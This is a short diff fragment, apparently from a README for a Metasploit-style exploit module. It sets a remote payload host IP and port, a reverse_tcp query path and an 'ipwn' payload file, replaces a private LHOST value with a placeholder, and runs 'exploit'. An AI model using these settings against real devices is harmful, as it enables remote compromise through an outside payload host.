@@ -17,7 +17,7 @@ set MHOST 74.208.82.221
 set MPORT 80
 set QUERY data/reverse_tcp/query
 set PEXEC data/ipwn/Payload
-set LHOST 192.168.0.191
+set LHOST <your local IP; does not really matter in this case>
 exploit
 
 In a Linux shell:
